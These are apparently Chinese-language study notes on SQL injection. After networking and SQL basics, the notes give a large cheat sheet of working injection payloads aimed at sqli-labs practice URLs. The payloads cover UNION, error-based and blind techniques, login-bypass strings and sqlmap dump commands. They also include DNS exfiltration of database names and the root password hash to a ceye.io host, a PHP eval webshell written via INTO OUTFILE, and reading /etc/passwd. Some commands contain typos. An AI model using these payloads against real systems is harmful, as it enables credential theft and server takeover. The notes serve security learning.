---
title: SQL注入漏洞
date: 2018-10-01 20:46:26
tags:
categories: sql注入
---

### 1. OSI七层模型

- 物理层 、数据链路层、网络层、传输层、会话层、表示层、应用层

### 2. TCP三次握手

- （1）客户端发送SYN（SEQ=x）报文给服务器端，进入SYN_SEND状态。
- （2）服务器端收到SYN报文，回应一个SYN （SEQ=y）ACK(ACK=x+1）报文，进入[SYN_RECV](https://baike.baidu.com/item/SYN_RECV)状态。
- （3）客户端收到服务器端的SYN报文，回应一个ACK(ACK=y+1）报文，进入Established状态。

### 3. TCP四次分手

- （1）某个应用进程首先调用close，称该端执行“主动关闭”（active close）。该端的TCP于是发送一个FIN分节，表示数据发送完毕。
- (2) 接收到这个FIN的对端执行 “被动关闭”（passive close），这个FIN由TCP确认。
- (3) 一段时间后，接收到这个文件结束符的应用进程将调用close关闭它的套接字。这导致它的TCP也发送一个FIN。
- (4) 接收这个最终FIN的原发送端TCP（即执行主动关闭的那一端）确认这个FIN。 

### 4. HTTP状态码

- 2XX  成功
- 3XX  跳转
- 4XX  错误
- 5XX   服务器错误

### 5.  常用端口

- 21   FTP
- 22  SSH
- 23  Telent
- 25   SMTP
- 53   DNS
- 80   HTTP
- 135 
- 139 
- 443  HTTPS
- 445  SMB
- 1433  SQLSERVER
- 1521   ORCAL
- 3306  MYSQL
- 3389   rdp
- 4899    远程桌面
- 5900-59XX   VNC
- 8080  管理端口

### 6. 数据库基础

#### 主流数据库

- SQL SERVER
- MYSQL
- oraccle
- PostgreSQL
- 可以使用  Navicat premium  连接数据库

#### 数据库查询版本

- Mssql   select  @@version
- Mysql    select  vresion（）/select @@version
- oracle    select banner from ￥version
- Postgresql  select version（）

#### SQL语法基础

- 库操作

  - 连接数据库   mysql  -u  用户名 -p
  - 创建数据库：create database  数据库名称、
  - 删除数据库    drop  database 数据库名称、
  - 列出数据库  show databases
  - 使用数据据库  use 数据库名称、
  - 查看当前数据库   select database（）

- 表操作

  - 新建表create table  表名（键 varchar（10），键int（10））
  - 列出表  show tables
  - 删除表  delete  表名

- 数据操作

  - 增加数据insert into  表名（键，键）values（值，值）

  - 删除数据 delete from 表名 where  键=值（删除某一行数据）

  - 修改数据 updata 表名 set 键 = 值 where 键=值

  - 查询数据  select * fom 表名

    存放数据库 information_ schema（存放schemata、  table、columns等等）     

    存放数据库名  schemata

    表  table

    字段  columns

### 7.  注入漏洞

#### 注入概述

- 什么是注入漏洞、
  - 注入攻击的本质，Web应用程序没有过滤用户输入*，直接把用户输入的恶意数据当做代码执行
  - 两个条件
    - 用户能够控制输入
    - 原本程序要执行的代码，拼接了用户输入的数据

#### 注入类型

- SQL注入：攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗数据库服务器执行恶意的SQL命令命令注入：后端未过滤掉恶意数据，代码当做系统命令执行。
- 代码注入：一般出现在不安全的使用某些函数
  - 文件包含
  - 反序列化漏洞
- LDAP注入
  - LDAP（轻量级目录访问协议），用于访问网络中的目录服务，常用在Active Directory，企业管理目录。
    用户提交的输入不经验证插入LDAP搜索过滤器中，攻击者通过提交专门设计的输入修改过滤器的结构，以检索数据或执行未授权操作
- XML注入
  - XXE漏洞：引用外部实体时，通过构造恶意内容，导致读取任意文件、
    执行系统命令、探测内网端口、攻击内网网站等危害。
  - XPath注入：与SQL注入类似，XPath解析器本身对URL、表单中提交的代码内容未作严格限制，导致恶意代码可以直接解析执行
  - XQuery注入
- JSON注入：轻量级的数据交换格式，主要利用特殊字符注入JSON中，造成解析失败
- JSONP注入：回调函数未作严格的检测和过滤
- 判断一个HTTP请求是否存在SQL注入的方式：
  - 经典：and1=1|and2>1|or1=1 |or1<1
  - 数据库函数：and sleep（4】=1 I and length（user（）】>3
  - 特殊符号：单引号（’）双引号（”）

#### 注入点

- GET
- POST
- Cookie
- Host
- User-Agent

#### 自动化注入工具

- （1）SQL注入工具：
  - Sqlmap Havij Sqlid
- （2）ASP，JSP注入工具：
  - NBSI阿D注入软件明小子注入软件
- （3）PHP注入工具：
  - 穿山甲注入软件海阳顶端注入软件

### 8. SQL手工注入步骤

#### 注入点寻找

- 判断请求方式

  - 浏览器F12  点网络

- 单引号闭合’  ‘

- 数字

- 单引号括号闭合（’ ‘）

- 双引号括号闭合（“ ”）

- or 1=1

- or 1=2

- and 1=1

- and 1=2

- #### 数字型注入

  - 加单引号  错误出异常
  - and 1=1   正常
  - and   1=2  异常

- #### 字符型注入

  - 加单引号  错误出异常
  - and '1' = '1  正常
  - and '1' = '2  异常

#### 判断字段长度

- order  by  数字   可以判断字段的个数
- 也可以用猜字段  union  select 1，2，3

#### 判断字段回显位置

在链接后面添加语句`【 union select 1,2,3,4,5,6,7,8,9,10,11#】`进行联合查询（联合查询时记得把前面的查询为空）来暴露可查询的字段号。 

#### 判断数据库注入

利用内置函数暴数据库信息 
version()版本；database()数据库；user()用户； 
不用猜解可用字段暴数据库信息(有些网站不适用): 
and 1=2 union all select version() 
and 1=2 union all select database() 
and 1=2 union all select user() 
操作系统信息：and 1=2 union all select @@global.version_compile_os from mysql.user 
数据库权限： 
and ord(mid(user(),1,1))=114 返回正常说明为root 

#### 查找数据库名

- GET：IP/Less-1/?id=100' union select 1,(select database()),3--+

- POST：union select 1,(select group_concat(schema_name) from information_schema.schemata),3--+

- 查看数据库长度length（） and length(database())>10--+

- 查看数据库名字mid（）或者left    

  - mid (string，start，length）返回指定的字符串从指定位置开始（可以用来猜数据库名 ） and mid(database(),1,1)>'a'

  - left (string,lenth)  返回最左边指定的字符数

    and left(database(),1)>'a'  (猜名字)

- 将查到的库名放到同一个字符串

  - select GROUP_CONCAT(schema_name) from information_schema.schemata

- 查到数单个据库名发送到ceye

  - union select 1,(select load_file(concat('\\\\',substr((select schema_name from information_schema.schemata  limit 1),1,41),'.mysql.ip.port.38ljf2.ceye.io\\abc')))--+

#### 查找数据表

- union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='security') ,3 

- 将单个表名发送到ceye

  uname=1') union select 3,(select load_file(concat('\\\\',substr((select table_name from information_schema.tables where table_schema ='security'  limit 1),1,41),'.mysql.ip.port.38ljf2.ceye.io\\abc')))--+

#### 查找数据表中所有字段（列）

- #### 127.0.0.1/Less-3/?id=100') union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security') --+

- 获取内容

  - union select 1,(select group_concat(username) from security.users limit 0,1),3 

- 查询某一个表的字段名发送到ceye

  - union select 1,(select load_file(concat('\\\\',substr((select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 1),1,41),'.mysql.ip.port.38ljf2.ceye.io\\abc')))--+

#### 猜解账号密码

- outfile文件注入

  - union select 1,'<?php @eval($_POST[360]);?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\Less-8\\3.php'--+
  - into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\Less-13\\1.txt'

- 查root密码ceye代码

  127.0.0.1/Less-1/?id=1' union SELECT 1,(LOAD_FILE(CONCAT('\\\\',mid((SELECT password FROM mysql.user WHERE user='root' LIMIT 1),2,41),'.mysql.ip.port.38ljf2.ceye.io\\abc'))),3--+

- bug   

  uname=1') or 1=1 into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\Less-13\\1.txt';--+

  这个文件里会有所有的用户名和密码

- 查询数据

  union select 1,(select 1 from (select count(*),concat((select(select(select distinct concat(username,password) from users limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) --+

#### 绕过登陆验证

- admin' --
- admin' #
- admin'/*
- ' or 1=1--
- ' or 1=1#
- ' or 1=1/*
- ') or '1'='1--
- ') or ('1'='1--

#### SQL注入常见函数

- group_concat函数   可以把查询的内容组合成一个字符串

- load_file(file name )  读取文件并将文件按字符串返回

- left（string，length）返回最左边指定的字符数：
  left（database（），1）>'s'  (猜名字)

- length（）判断长度
  length（database（）>5 

- substr（a，b，c）从字符串a中截取 b到c长度

- ascii（）将某个字符转为ascii值

  ascii（substr（user（），1，1））=101#

- mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）

### 9. SQL注入备忘

#### SQL注入常用命令

- 查看当前用户：union select 1,(select user())--+

- 查看数据库版本：union select 1,(select version())--+

- 查看当前数据库名：union select 1,(select database())--+

- 查看操作系统union select 1,(select @@version_compile_os)--+

- 所有用户：

  - union select 1,(select group_concat(user) from mysql.user)--

    +

- 用户hash

  - union select 1,(select group_concat(password) from mysql.user where user='root')

- 查看所有数据库名

  - union select 1,(SELECT group_concat(schema_name) from information_schema.schemata)--+

- 查看某一个库的全部表

  - union select 1,(SELECT group_concat(table_name) from information_schema.tables where table_schema='库名')--+
  - union select 1,(SELECT group_concat(table_name) from information_schema.table_constraints where table_schema='库名'

- 查看某个表的字段名

  - union select 1,(SELECT group_concat(column_name) from information_schema.columns where table_name='表名')--+

- 查看某个库中某个表的字段名

  - union select 1,(select group_concat(column_name) from information_schema.columns where table_name='表名' and table_schema='库名')--+

- 读文件

  - union select 1,(SELECT load_file('/etc/passwd'))--+

- 写文件

  - union select 1,'<?php @eval($_POST[360]);?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\Less-8\\3.php'--+

#### UNION注入

- 猜字段长度
  - order by 数字     uname=1' order by 2
- 暴字段位置
  - union select 1,2      uname=1' union select 1,2
- 在指定表中查询制指定用户的密码
  - union SELECT 1,password from 表 where username='用户名'--+

#### 报错注入

- floor   （SELECT user()可修改）

  - OR (SELECT 8627 FROM(SELECT COUNT(*),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--+

- ### ExtractValue(有长度限制,最长32位)   （select @@version可修改）

  - and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+

- ### UpdateXml(有长度限制,最长32位)  （SELECT @@version可修改）

  - and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+

- ### NAME_CONST(适用于低版本，不太好用)

  - and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--+

- ### Error based Double Query Injection

  - or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1--+

- ### exp(5.5.5以上) （select user()可修改）

  - and (select exp(~(select * from(select user())x)))--+

- floor(Mysql):  and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

- Extractvalue(Mysql):  and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

- Updatexml(Mysql):  and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

- EXP: and exp(~(select * from(select user())a));

- UTL INADDR. get host address(Oracle): and 1=utl inaddrget host address(select bannerO from sys.v_$version where rownum=1))

- multipoint(Mysql)：and multipoint((select * from(select * from(select user())a)b));

- polygon(Mysql)：and polygon((select * from(select * from(select user())a)b));

- multipolygon(Mysql)：and multipolygon((select * from(select * from(select user())a)b));

- linestring(Mysql)：and linestring((select * from(select * from(select user())a)b));

- multilinestring(Mysql)：and multilinestring((select * from(select * from(select user())a)b));

#### bool盲注

- 盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。

- ##### 布尔条件构造

  - ```sql
    //正常情况
    'or bool#
    true'and bool#
        
    //不使用空格、注释
    'or(bool)='1
    true'and(bool)='1
        
    //不使用or、and、注释
    '^!(bool)='1
    '=(bool)='
    '||(bool)='1
    true'%26%26(bool)='1
    '=if((bool),1,0)='0
        
    //不使用等号、空格、注释
    'or(bool)<>'0
    'or((bool)in(1))or'0
        
    //其他
    or (case when (bool) then 1 else 0 end)
    ```

  - 有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz

  - ```sql
    1' or (bool) or '1'='1
    1%' and (bool) or 1=1 and '1'='1
    ```

- ##### 构造逻辑判断

  - 逻辑判断基本就那些函数：

  - ```sql
    left(user(),1)>'r'  
    right(user(),1)>'r'  
    substr(user(),1,1)='r'  
    mid(user(),1,1)='r' 
        
    //不使用逗号 
    user() regexp '^[a-z]'
    user() like 'root%'
    POSITION('root' in user())
    mid(user() from 1 for 1)='r'
    mid(user() from 1)='r'
    ```

- ##### 利用order by盲注

  ```sql
  mysql> select * from admin where username='' or 1 union select 1,2,'5' order by 3;
  +----+----------+---------------------------
  | id | username | password                   
  +----+----------+---------------------------
  |  1 | 2        | 5                         
  |  1 | admin    | 51b7a76d51e70b419f60d34 |
  +----+----------+---------------------------
  2 rows in set (0.00 sec)
      
  mysql> select * from admin where username='' or 1 union select 1,2,'6' order by 3;
  +-----+--------+---------------------------
  |id   |username| password                  
  +----+--------+---------------------------
  |  1  | admin- |51b7a76d51e70b419f60d3
  |  1  |    2   | 6                            +------+----------+-------------------------
  2 rows in set (0.01 sec)
  ```

#### 延时盲注

- 相对于bool盲注，就是把返回值0和1改为是否执行延时，**能用其他方法就不使用延时**。 
- 一般格式`if((bool),sleep(3),0)`和`or (case when (bool) then sleep(3) else 0 end)`
- 两个函数： 
- BENCHMARK(100000,MD5(1)) 
- sleep(5)
- BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()

#### Mysql注释符

```sql
1. -- -
2. /* .... */
3. #
4. `
5. ;%00 
```

#### GBK绕过注入

- 在分号前加%df%27
- 示例：id=1%d%27 union select 1.2--+

10. 自动化注入工具

#### SQL注入工具

- sqlmap使用
  - 测试注入点  sqlmap  -u  "URL"
  - 爆数据库  sqlmap  -u  "URL"  --dbs
  - 查看当前库  sqlmap  -u  "URL"  --current -db
  - 显示数据表  sqlmap  -u  "URL"  -D 数据库 --tables
  - 显示字段      sqlmap  -u  "URL"  -D 数据库 -T 表  --columns
  - 脱库  sqlmap  -u  "URL"  -D 数据库 -T 表  -C "字段名1","字段名2"  --dump
  - 查看帮助   man  sqlmap
  - 查看注入点   sqlmap -r  1.txt 
  - 爆数据库   sqlmap -r  1.txt  --dbs    （注意在注入点后面加*）
  - 查看当前库  sqlmap  -r  1.txt  --current -db
  - 显示数据表   sqlmap   -r  1.txt   -D 数据库 --tables
  - 显示字段      sqlmap  -r  1.txt  -D 数据库 -T 表  --columns
  - 查看某字段数据  sqlmap  -r  1.txt  -D 数据库 -T 表  -C  “字段名，字段名”  --dump
- havij
- sqlid

#### ASP、JSP注入工具

- NBSI
- 阿D注入软件
- 明小子

#### PHP注入工具

- 穿山甲注入软件
- 海阳顶端注入软件

#### 安全专家用的注入工具

- BSQL Hacker（注入框架）
- The Mole（可攻击Mysql、SQL server、Postgres和oracle）
- Pangolin （白帽专用啊哈哈哈哈）
- sqlamp  （非常强大）
- Havij （可攻击Mysql、oracle、Postgres、MS Access）
- safe3 SQL Injector（简单易用）
- SQL Poizon

### 10. 笔记

- 爆SQL
  select schema_name from information_schema.schemata
  猜数据库
  select schema_name from information_schema.schemata limit 0,1 （limit第几行）
  test
- select table_name from information_schema.tables where table_schema='xxxxx'
  猜某库的数据表
- select column_name from information_schema.columns where table_name='xxxxx'
  猜某表的所有列
- select *** from ***
- 
- mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位
  ord 同ASCII
  substr（user(),2,1）
  substr（database(),2,1）从databases数据库名的第2位，截取长度为1
  Order by 对前面的数据进行排序
  information_schema 系统数据库名
  tables 表名
  information_schema.tables 查询这个数据库表
  table_schema 这个字段
  select table_name from information_schema.tables where table_schema = "security";
  select 列名称from表名 where列 运算符 值
  @$sql="SELECT username, password FROM users WHERE username='admin'or'1'='1# and
  password='$passwd' LIMIT 0,1";
  数据库运行的SQL语句代码如上:
  输入“ ‘后，注意 提示语法错误的 注明 ’ ” ）
  ') or '1'=('1' 
  ) or 1=1 -
  ') or 1=1 order by 2  查看几列
- 显示登录信息可以使用联合查询得到数据库名等信息
  uname=1admin'union select 1,database()-- -&passwd=&submit=Submit
  联合查询  得到  database(数据库名)
- 不显示登录信息使用 布尔型盲注
  uname=admin')and left(database(),1)>'a'#&passwd=1&submit=Submit
  database(),1表示第一位 >大于a        大于的话就返回true
  left(database(),1) ='s'    截取数据库名的前1位 
  left(database(),2) ='se'  截取数据库名的前2位 
  length(database())=8  查看数据库的长度
  left(version()1)=5    查看数据库第1位为5
  通过二分法 查到某位没有>,= a（或者数字）
  注释掉最后字符 -- - --+ # %23 （每个试）
- substr(database(),,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换
  为 ascii 值
- admin'and If(ascii(substr(database(),2,1))=115,1,sleep(5))#
  时间注入 正确的话 直接登录，否则延迟5秒，得出 数据库名为 security
  'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))-- -
  猜测第一个数据表的第一位是 e...依次类推，得到 emai
  limit 0,1 从0的位置开始 第1行 是emai  limit 1,1 从1的位置开始 第1行 是 ？？
  猜测 users 表的列
  http://127.0.0.1/sqllib/Less-9/?id=1'and If(ascii(substr((select column_name from information
  _schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+
  猜测 username 的值
  http://127.0.0.1/sqllib/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))-- -
  猜第2位
  'and If(ascii(substr((select username from users limit 0,1), 2,1))=117,1,sleep(5))-- -
  是Dump
  SELECT CONCAT(id, '，', name) AS con FROM info LIMIT 1
  concat 某几列
  limit1    行1
  以上为  查询第一行的  id 列 和name列，中间用,号隔开
- 报 错 注 入
  1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+
- uname=admin"and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&passwd=1&sub
  If(ascii(substr(database(),1,1))>115,0,sleep(5))%23
- select table_name from information_schema.tables where table_schema='security' limit 0,1
  table_name   
  MYSQL 里面所有的表
  information_schema.tables
- 系统函数
  介绍几个常用函数：
- 1. version()——MySQL 版本
  2. user()——数据库用户名
  3. database()——数据库名
  4. @@datadir——数据库路径
  5. @@version_compile_os——操作系统版本